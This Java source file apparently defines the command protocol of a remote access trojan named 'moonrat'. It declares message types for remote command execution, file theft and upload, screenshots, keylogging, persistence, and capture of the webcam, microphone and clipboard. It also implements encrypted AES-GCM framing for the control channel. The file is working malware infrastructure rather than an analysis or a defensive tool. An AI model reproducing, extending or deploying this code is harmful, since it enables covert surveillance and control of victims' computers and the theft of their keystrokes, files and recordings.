package moonrat;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public final class Protocol {
    private Protocol() {}

    public static final int HELLO = 1;
    public static final int PING = 2;
    public static final int PONG = 3;

    public static final int LS_REQ = 0x10;
    public static final int LS_RESP = 0x11;
    public static final int GET_REQ = 0x20;
    public static final int GET_RESP = 0x21;
    public static final int SHOT_REQ = 0x30;
    public static final int SHOT_RESP = 0x31;
    public static final int EXEC_REQ = 0x40;
    public static final int EXEC_RESP = 0x41;
    public static final int PUT_REQ = 0x50;
    public static final int PUT_RESP = 0x51;
    public static final int ZIP_REQ = 0x60;
    public static final int ZIP_RESP = 0x61;
    public static final int BSOD_REQ = 0x70;
    public static final int BSOD_RESP = 0x71;
    public static final int SOUND_REQ = 0x72;
    public static final int SOUND_RESP = 0x73;
    public static final int NOTIFY_REQ = 0x74;
    public static final int NOTIFY_RESP = 0x75;
    public static final int KEYLOG_REQ = 0x76;
    public static final int KEYLOG_RESP = 0x77;
    public static final int RUN_REQ = 0x80;
    public static final int RUN_RESP = 0x81;
    public static final int GAME_REQ = 0x90;
    public static final int GAME_RESP = 0x91;
    public static final int PERSIST_REQ = 0xA0;
    public static final int PERSIST_RESP = 0xA1;
    public static final int CAM_REQ = 0xB0;
    public static final int CAM_RESP = 0xB1;
    public static final int MIC_REQ = 0xB2;
    public static final int MIC_RESP = 0xB3;
    public static final int CLIP_REQ = 0xB4;
    public static final int CLIP_RESP = 0xB5;

    public static final int MAX_FRAME = 96 * 1024 * 1024;

    private static final int IV_LENGTH = 12;
    private static final int TAG_BITS = 128;
    private static final SecureRandom RANDOM = new SecureRandom();

    private static volatile SecretKeySpec channelKey;

    public static void usePassphrase(String passphrase) throws Exception {
        if (passphrase == null || passphrase.isEmpty()) {
            channelKey = null;
            return;
        }
        byte[] digest = MessageDigest.getInstance("SHA-256").digest(passphrase.getBytes(StandardCharsets.UTF_8));
        channelKey = new SecretKeySpec(digest, "AES");
    }

    public static boolean secured() {
        return channelKey != null;
    }

    private static byte[] seal(byte[] plain) throws Exception {
        byte[] iv = new byte[IV_LENGTH];
        RANDOM.nextBytes(iv);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, channelKey, new GCMParameterSpec(TAG_BITS, iv));
        byte[] ciphertext = cipher.doFinal(plain);
        byte[] sealed = new byte[IV_LENGTH + ciphertext.length];
        System.arraycopy(iv, 0, sealed, 0, IV_LENGTH);
        System.arraycopy(ciphertext, 0, sealed, IV_LENGTH, ciphertext.length);
        return sealed;
    }

    private static byte[] open(byte[] sealed) throws Exception {
        if (sealed.length < IV_LENGTH + TAG_BITS / 8) throw new IOException("short sealed frame");
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, channelKey,
                new GCMParameterSpec(TAG_BITS, Arrays.copyOfRange(sealed, 0, IV_LENGTH)));
        return cipher.doFinal(sealed, IV_LENGTH, sealed.length - IV_LENGTH);
    }

    public static final class Frame {
        public int type;
        public int reqId;
        public List<String> fields = new ArrayList<>();
        public byte[] blob = new byte[0];

        public Frame(int type) {
            this.type = type;
        }

        public Frame(int type, String... fields) {
            this.type = type;
            this.fields = new ArrayList<>(Arrays.asList(fields));
        }

        public String field(int index) {
            return index < fields.size() ? fields.get(index) : "";
        }
    }

    public static void writeFrame(DataOutputStream out, Frame frame) throws IOException {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        DataOutputStream sink = new DataOutputStream(buffer);
        sink.writeInt(frame.type);
        sink.writeInt(frame.reqId);
        sink.writeInt(frame.fields.size());
        for (String field : frame.fields) {
            byte[] bytes = field.getBytes(StandardCharsets.UTF_8);
            sink.writeInt(bytes.length);
            sink.write(bytes);
        }
        sink.writeInt(frame.blob.length);
        sink.write(frame.blob);
        byte[] payload = buffer.toByteArray();
        byte[] wire;
        if (channelKey == null) {
            wire = payload;
        } else {
            try {
                wire = seal(payload);
            } catch (Exception failure) {
                throw new IOException("encrypt failed", failure);
            }
        }
        out.writeInt(wire.length);
        out.write(wire);
        out.flush();
    }

    public static Frame readFrame(DataInputStream in) throws IOException {
        int length = in.readInt();
        if (length < 0 || length > MAX_FRAME + 256) throw new IOException("bad frame size " + length);
        byte[] wire = new byte[length];
        in.readFully(wire);

        byte[] payload;
        if (channelKey == null) {
            payload = wire;
        } else {
            try {
                payload = open(wire);
            } catch (Exception failure) {
                throw new IOException("decrypt failed", failure);
            }
        }

        DataInputStream source = new DataInputStream(new ByteArrayInputStream(payload));
        Frame frame = new Frame(source.readInt());
        frame.reqId = source.readInt();

        int fieldCount = source.readInt();
        for (int index = 0; index < fieldCount; index++) {
            int size = source.readInt();
            byte[] bytes = new byte[size];
            source.readFully(bytes);
            frame.fields.add(new String(bytes, StandardCharsets.UTF_8));
        }

        int blobSize = source.readInt();
        frame.blob = new byte[blobSize];
        source.readFully(frame.blob);
        return frame;
    }
}
